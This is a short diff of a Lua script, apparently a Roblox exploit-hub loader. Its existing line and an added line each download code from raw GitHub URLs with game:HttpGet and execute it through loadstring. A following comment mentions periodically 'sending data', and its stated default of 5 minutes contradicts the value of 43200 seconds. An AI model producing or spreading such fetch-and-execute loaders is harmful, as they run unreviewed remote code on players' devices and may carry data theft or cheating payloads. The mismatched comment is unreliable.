@@ -1,4 +1,6 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/serenityhub"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/akagikay/far/refs/heads/main/buy"))()
+
 -- Adjustable interval for sending data (in seconds)
 local sendInterval = 43200 -- Default: 5 minutes
 
